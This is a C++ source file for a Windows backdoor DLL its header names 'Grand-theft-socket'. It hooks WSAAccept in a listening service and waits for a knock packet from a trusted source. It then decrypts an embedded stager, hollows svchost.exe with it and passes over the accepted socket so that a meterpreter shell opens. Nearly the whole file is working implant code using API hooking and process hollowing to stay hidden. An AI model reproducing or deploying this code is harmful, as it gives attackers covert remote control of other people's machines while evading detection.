//
// MIT License
//
// Copyright (c) 2019 Rokas Kupstys
//
// Permission is hereby granted, free of charge, to any person obtaining a
// copy of this software and associated documentation files (the "Software"),
// to deal in the Software without restriction, including without limitation
// the rights to use, copy, modify, merge, publish, distribute, sublicense,
// and/or sell copies of the Software, and to permit persons to whom the
// Software is furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
// THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
// FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
// DEALINGS IN THE SOFTWARE.
//
// Grand-theft-socket - a method to backdoor a machine by piggy-backing on to services that are already listening on
// incoming connections. DLL hooks accept()/WSAAccept() API and spawns meterpreter shell upon connection if certain
// parameters of connection match. Otherwise normal connection proceeds.
//
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <hooker.h>
#include <time.h>
#include "../shared/shellcode.h"
#include "../shared/process_hollowing.h"
#include "../shared/resources.h"
#include "../shared/win32.h"
#include "../shared/math.h"
#include "../shared/rc4.h"
#include "../shared/debug.h"
#include "../shared/ReflectiveLoader.h"
#include "../shared/payload.h"
#include "../config.h"
#include "stager.exe.h"

typedef SOCKET(WSAAPI*WSAAccept_t)(SOCKET, struct sockaddr*, LPINT, LPCONDITIONPROC, DWORD_PTR);
WSAAccept_t _WSAAccept = 0;
context ctx{};

enum SocketAction
{
    SocketDisconnect,
    SocketContinue,
};

SocketAction handle_socket(SOCKET s)
{
    if (s == INVALID_SOCKET)
        return SocketContinue;

    sockaddr addr{};

    int sock_len = sizeof(addr);
    if (getpeername(s, (struct sockaddr*)&addr, &sock_len) != 0)
    {
        LOG_DEBUG("getpeername() error %d", WSAGetLastError());
        return SocketContinue;
    }

    // Possible knock
    vr_payload packet;
    if (recv(s, (char*)&packet, sizeof(packet), MSG_PEEK) == sizeof(packet))
    {
        if (handle_payload(ctx, (uint8_t*)&packet, sizeof(packet), (void*)&addr))
        {
            // A knock. Ignore this socket
            LOG_DEBUG("Knock accepted from %s", inet_ntoa(((sockaddr_in*)& ctx.trusted_source)->sin_addr));
            return SocketDisconnect;
        }
    }

    if (ctx.trusted_source.size() == 0)
    {
        LOG_DEBUG("Trusted source is not set");
        return SocketContinue;
    }

    // Trusted address is set. This could be backdoor connection.
    stl::string source_address;
    source_address.resize(45);
    void* addr_in = nullptr;
    if (addr.sa_family == AF_INET)
        addr_in = &((sockaddr_in*)&addr)->sin_addr;
    else if (addr.sa_family == AF_INET6)
        addr_in = &((sockaddr_in6*)&addr)->sin6_addr;
    if (addr_in)
        inet_ntop(addr.sa_family, addr_in, &source_address.at(0), source_address.size());

    if (source_address != ctx.trusted_source)
    {
        LOG_DEBUG("Untrusted source %s, trusted source %s", source_address.c_str(), ctx.trusted_source.c_str());
        return SocketContinue;
    }

    ctx.trusted_source.resize(0);

    if ((time(nullptr) - ctx.payload_last_timestamp > 30))
    {
        // Our connection, but rather late
        LOG_DEBUG("Knock timeout");
        return SocketDisconnect;
    }

    LOG_DEBUG("Spawn stager");

    bool result = false;
    hollow_process_information pi{};
    HANDLE hMapping = nullptr;
    uint8_t* shared_memory = nullptr;

    do
    {
        stl::vector<uint8_t> stager;
        stager.resize(RSRC_STAGER_SIZE);
        if (!resource_open(stager, RSRC_STAGER_DATA, sizeof(RSRC_STAGER_DATA), RSRC_STAGER_KEY, RSRC_STAGER_KEY_SIZE))
            break;

        stl::string mapping_name = "Global\\" + deterministic_uuid(gts_shared_memory_name);
        
        // We use shared memory for passing information to the child because it is trivial. Much easier than
        // say a named pipe.
        static_assert(sizeof(WSAPROTOCOL_INFOW) + sizeof(long) < 0x2000);
        hMapping = CreateFileMappingA(INVALID_HANDLE_VALUE, nullptr, PAGE_READWRITE, 0, 0x2000, mapping_name);

        if (hMapping == nullptr)
            break;

        shared_memory = (uint8_t*)MapViewOfFile(hMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0x2000);
        if (shared_memory == nullptr)
            break;

        // Ensure "completed" flag is zero
        InterlockedExchange((volatile long*)shared_memory, 0);

        hollow_process_startup_info info{};
        stl::string host = GetFolderPath(CSIDL_SYSTEM) + "\\svchost.exe";
        pi = hollow_process(stager.data(), host.c_str(), &info);

        if (!pi.hThread)
            break;

        if (WSADuplicateSocketW(s, pi.dwProcessId, (LPWSAPROTOCOL_INFOW)(shared_memory + sizeof(long))) == SOCKET_ERROR)
            break;

        ResumeThread(pi.hThread);
        result = true;
    } while (false);

    if (!result)
        TerminateProcess(pi.hProcess, 0);
    else
    {
        // Wait up to 1s until spawned process duplicates a socket
        for (int i = 0; i < 1000 && InterlockedCompareExchange((volatile long*)shared_memory, 1, 1) != 1; i++)
            Sleep(1);
        // Socket is still alive in another process
        closesocket(s);
    }

    if (shared_memory)
        UnmapViewOfFile(shared_memory);
    if (hMapping)
        CloseHandle(hMapping);

    if (pi.hThread)
        CloseHandle(pi.hThread);
    if (pi.hProcess)
        CloseHandle(pi.hProcess);

    return SocketDisconnect;
}

SOCKET WSAAPI WSAAccept_hook(SOCKET s, struct sockaddr* addr, LPINT addrlen, LPCONDITIONPROC lpfnCondition, DWORD dwCallbackData)
{
    SOCKET accepted_socket = _WSAAccept(s, addr, addrlen, lpfnCondition, dwCallbackData);
    if (handle_socket(accepted_socket) == SocketDisconnect)
    {
        WSASetLastError(WSAECONNRESET);
        return INVALID_SOCKET;
    }
    return accepted_socket;
}

int main()
{
    deterministic_uuid_seed = get_machine_hash();
    HMODULE ws2_32 = GetModuleHandleW(L"ws2_32.dll");
    if (ws2_32)
    {
        void* WSAAccept_proc = (void*)GetProcAddress(ws2_32, "WSAAccept");
        if (WSAAccept_proc)
            _WSAAccept = (WSAAccept_t)hooker_redirect(WSAAccept_proc, (void*)&WSAAccept_hook, 0);
    }

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH)
    {
        main();
    }

    return TRUE;
}
